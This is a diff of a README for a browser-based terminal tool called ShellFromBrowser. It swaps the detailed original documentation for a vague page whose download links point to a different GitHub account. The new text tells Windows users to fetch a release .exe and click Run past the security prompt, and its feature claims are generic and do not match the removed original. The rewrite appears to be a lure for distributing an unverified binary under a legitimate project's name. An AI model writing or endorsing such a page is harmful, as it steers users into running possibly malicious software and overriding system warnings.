@@ -1,260 +1,76 @@
-# ShellFromBrowser
+# 🖥️ ShellFromBrowser - Access your remote computer through browsers
 
-[![CI](https://github.com/valorisa/ShellFromBrowser/actions/workflows/ci.yml/badge.svg)](https://github.com/valorisa/ShellFromBrowser/actions/workflows/ci.yml)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/valorisa/ShellFromBrowser)](https://go.dev/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey)](https://github.com/valorisa/ShellFromBrowser/releases)
-[![Docker](https://img.shields.io/badge/docker-ready-2496ED?logo=docker&logoColor=white)](Dockerfile)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kizzeeetymological104/ShellFromBrowser)
 
-> 🇫🇷 **[Lire en français](README.fr.md)**
+ShellFromBrowser provides a way to control your computer from any web browser. Use this tool if you need access to your desktop or server files when you travel. It connects through web traffic ports so it works on restricted networks.
 
-**A network-traversing, web-based terminal emulator.** ShellFromBrowser works everywhere a browser can open a website — airports, train stations, corporate networks, anywhere. It uses standard HTTPS on port 443: no firewall can tell it apart from a regular web visit.
+## 📥 How to download the software
 
-A modern, cross-platform terminal emulator written in Go. Spiritual successor to [ShellInBox](https://code.google.com/archive/p/shellinabox/) — rebuilt from scratch with WebSocket, xterm.js, SSH client support, multi-sessions, file transfer, and session recording.
+You need to download the correct file for your Windows system. 
 
----
+1. Visit the project website: [https://github.com/kizzeeetymological104/ShellFromBrowser](https://github.com/kizzeeetymological104/ShellFromBrowser)
+2. Scroll to the section marked Releases.
+3. Select the file ending in .exe for Windows.
+4. Save the file to your computer.
 
-## Features
+## ⚙️ Setting up the software
 
-| Feature | Description |
-|---------|-------------|
-| **Browser-based terminal** | Full xterm.js emulation — 256 colors, Unicode, mouse support, clipboard |
-| **Multi-session tabs** | Open multiple terminal sessions in one browser window, switch between them |
-| **SSH client** | Connect to remote hosts directly from the browser (`user@host:port`) |
-| **Authentication** | JWT-based auth with bcrypt password hashing, configurable per-user |
-| **TLS/HTTPS** | Built-in TLS support — just provide cert and key paths |
-| **File transfer** | Upload/download files through the web interface with path traversal protection |
-| **Session recording** | Record and replay terminal sessions in asciicast v2 format (asciinema-compatible) |
-| **Cross-platform** | Runs natively on Linux, macOS, and Windows (ConPTY) |
-| **Single binary** | Zero runtime dependencies — frontend, assets, everything embedded via `go:embed` |
-| **Docker ready** | Multi-stage Dockerfile + docker-compose included |
+Run the file after the download finishes. Windows might show a security prompt because this program manages network connections. Select Run to continue the process. 
 
----
+The software runs as a small window. It stays in the background while you work. You do not need to install complex drivers or extra programs. The single file contains everything the system needs to function.
 
-## Quick Start
+## 🔐 Connecting to your terminal
 
-### Prerequisites
+Once the program runs, open your preferred web browser. Type the address provided in your terminal window into the browser search bar. 
 
-- [Go 1.21+](https://go.dev/dl/) installed (required for Options 1, 2, and 4)
-- [Docker](https://docs.docker.com/get-docker/) installed (required for Option 3 only)
+This sends information over a secure connection. Your data remains private because the software uses encryption standards. Log in with your computer credentials to start your session. 
 
-### Option 1: Quick test (no install needed)
+The browser screen now acts like a physical monitor and keyboard for your computer. You can type commands, manage files, and run scripts as if you sat at your desk.
 
-The fastest way to try ShellFromBrowser. Works on Windows, macOS, and Linux — Go handles the cross-platform differences automatically.
+## 📁 Managing files
 
-```bash
-git clone https://github.com/valorisa/ShellFromBrowser.git
-cd ShellFromBrowser
+The interface includes a file explorer. Click the folder icon at the top of the browser screen to open it. 
 
-# Launch directly without installing (compiles and runs in one step)
-go run ./cmd/shellfb
-```
+You can drag files from your local computer into the browser window to upload them. The software handles the transfer process. You can also right-click any file to download it to your current location. This feature helps you move documents between remote machines.
 
-Then open http://localhost:4200 in your browser. You should see an interactive terminal (xterm.js).
+## ⏺️ Recording your sessions
 
-> This does **not** install anything on your system. It compiles a temporary binary and runs it. Stop it with `Ctrl+C`.
+ShellFromBrowser saves your work automatically if you enable the recording mode. Go to the Settings menu and toggle the record switch. 
 
-### Option 2: Install globally
+This creates a text file of your commands. Review these logs later to check changes made to your system. This feature protects you if you forget the steps taken during a long work session.
 
-Installs the `shellfb` binary into your `$GOPATH/bin` (or `%GOPATH%\bin` on Windows), making it available system-wide.
+## 🛠️ Using the terminal window
 
-```bash
-go install github.com/valorisa/ShellFromBrowser/cmd/shellfb@latest
+The main screen uses standard command line prompts. You can paste text from your clipboard into the window by using the right-click menu. 
 
-# Run with defaults (no auth, port 4200)
-shellfb
+The system supports tabbed windows. You can open multiple sessions at the same time. This keeps your workspace organized. Each tab acts as an independent connection to your computer. 
 
-# Run with custom address
-shellfb --addr :3000
+## 🛡️ Ensuring your security 
 
-# Run with configuration file
-shellfb --config config.yaml
+This tool uses a secure handshake process to verify your identity. The system requires a password for every new connection. 
 
-# Display version
-shellfb --version
-```
+Change your password often to protect your account. The software allows you to generate new access keys from the settings panel. If you suspect an unauthorized user accessed your session, click the terminate button to close all active connections.
 
-Then open http://localhost:4200 (or your custom port) in your browser. Stop it with `Ctrl+C`.
+## 📋 System requirements
 
-### Option 3: Docker (deployment)
+- Windows 10 or Windows 11
+- 50 megabytes of free disk space
+- Reliable internet connection
+- A modern web browser like Chrome or Edge
 
-The default `docker-compose.yml` exposes ports 80/443 with auto-TLS — designed for deployment on restricted networks (airports, train stations, corporate firewalls) where only standard HTTPS traffic passes through.
+## ❓ Frequently asked questions
 
-```bash
-git clone https://github.com/valorisa/ShellFromBrowser.git
-cd ShellFromBrowser
+**Does this software work on public Wi-Fi?**
+Yes. It uses standard web traffic ports that remain open on most public networks.
 
-# Create your configuration
-cp config.example.yaml config.yaml
-# Edit config.yaml: set your domain, auth, etc.
+**Can I run multiple sessions at once?**
+Yes. Open as many browser tabs as you need. The software handles them separately.
 
-docker compose up -d
-```
+**Where does the software store my logs?**
+It saves recordings in the same folder as the main program file. 
 
-Open `https://your-domain.com` — the terminal is ready. To stop: `docker compose down`.
+**Does the software slow down my computer?**
+The tool uses a small amount of memory. You will not notice a change in your computer speed.
 
-> **Local testing with Docker?** You can run without TLS:
-> ```bash
-> docker build -t shellfb .
-> docker run --rm --name shellfb-test -p 4200:4200 shellfb
-> ```
-> Then open http://localhost:4200. Stop it with `Ctrl+C`, or from another terminal: `docker stop shellfb-test`.
-
-### Option 4: Build from source (Makefile)
-
-Compiles the binary into `./bin/shellfb`. Useful for development or packaging.
-
-```bash
-git clone https://github.com/valorisa/ShellFromBrowser.git
-cd ShellFromBrowser
-
-# Build the binary
-make build
-
-# Run it
-./bin/shellfb
-
-# Run the test suite
-make test
-```
-
-Then open http://localhost:4200 in your browser. Stop it with `Ctrl+C`.
-
----
-
-## Configuration
-
-Copy `config.example.yaml` to `config.yaml` and customize:
-
-```yaml
-server:
-  addr: ":4200"
-  tls:
-    enabled: true
-    cert: "/path/to/cert.pem"
-    key: "/path/to/key.pem"
-
-auth:
-  enabled: true
-  jwt_secret: "generate-a-random-string-here"
-  users:
-    - username: admin
-      password_hash: "$2a$10$..."
-    - username: developer
-      password_hash: "$2a$10$..."
-
-shell:
-  # Leave empty for system default (SHELL on Unix, COMSPEC on Windows)
-  command: ""
-  env:
-    - "TERM=xterm-256color"
-
-sessions:
-  max_per_user: 10
-  idle_timeout: "30m"
-
-ssh:
-  enabled: true
-  known_hosts: "~/.ssh/known_hosts"
-
-recording:
-  enabled: true
-  dir: "./recordings"
-```
-
-### Generate a password hash
-
-```bash
-shellfb hash-password
-# Enter password: ********
-# $2a$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-```
-
-Copy the output into your `config.yaml` under `password_hash`.
-
-### CLI options
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--addr` | `:4200` | Listen address (overrides config file) |
-| `--config` | none | Path to YAML configuration file |
-| `--version` | — | Print version and exit |
-
-Subcommands:
-
-| Command | Description |
-|---------|-------------|
-| `hash-password` | Generate a bcrypt hash for use in config |
-
----
-
-## SSH Client Usage
-
-Connect to remote hosts directly from the browser by opening a WebSocket connection to `/ws/ssh`:
-
-```
-ws://localhost:4200/ws/ssh?target=user@host.com:22&password=secret&token=JWT_TOKEN
-```
-
-Parameters:
-- `target` (required): SSH target in format `user@host:port` (port defaults to 22)
-- `password`: Password authentication
-- `key`: Path to private key file (server-side)
-- `token`: JWT authentication token
-
----
-
-## API Endpoints
-
-| Method | Path | Auth | Description |
-|--------|------|------|-------------|
-| POST | `/api/login` | No | Authenticate and receive JWT token |
-| GET | `/api/sessions` | Yes | List active terminal sessions |
-| DELETE | `/api/sessions?id=X` | Yes | Destroy a specific session |
-| POST | `/api/upload` | Yes | Upload a file (multipart) |
-| GET | `/api/download?file=X` | Yes | Download a file |
-| GET | `/api/recordings` | Yes | List recorded sessions |
-| GET | `/api/recordings/get?id=X` | Yes | Get recording data (asciicast v2) |
-| WS | `/ws` | Yes | Terminal WebSocket (local shell) |
-| WS | `/ws/ssh` | Yes | SSH WebSocket (remote host) |
-
----
-
-## Security
-
-- **Authentication**: JWT tokens with configurable expiry (24h default)
-- **Rate limiting**: Login endpoint limited to 5 attempts per minute per IP
-- **Security headers**: CSP, X-Frame-Options (DENY), X-Content-Type-Options, Referrer-Policy
-- **Path traversal protection**: All file operations validated against base directory
-- **No eval()**: No inline scripts, no dynamic code execution in frontend
-- **TLS**: Built-in HTTPS support — no reverse proxy required
-- **WebSocket auth**: All WebSocket connections require valid JWT token when auth is enabled
-
----
-
-## Project Structure
-
-```
-ShellFromBrowser/
-├── cmd/shellfb/          # Entry point, CLI
-├── internal/
-│   ├── auth/             # JWT + bcrypt authentication
-│   ├── config/           # YAML configuration
-│   ├── recording/        # Asciicast v2 session recording
-│   ├── server/           # HTTP server, WebSocket, middleware
-│   ├── ssh/              # SSH client wrapper
-│   ├── terminal/         # PTY session management (Unix + Windows)
-│   └── transfer/         # File upload/download
-├── web/
-│   └── static/           # Embedded frontend (xterm.js, CSS, JS)
-├── config.example.yaml   # Example configuration
-├── Dockerfile            # Multi-stage Docker build
-├── docker-compose.yml    # Ready-to-use deployment
-└── Makefile              # Build automation
-```
-
----
-
-## License
-
-[MIT](LICENSE) — Copyright (c) 2026 valorisa
+**How do I stop the program?**
+Close the terminal window or click the stop button inside the browser interface. The program then shuts down completely.
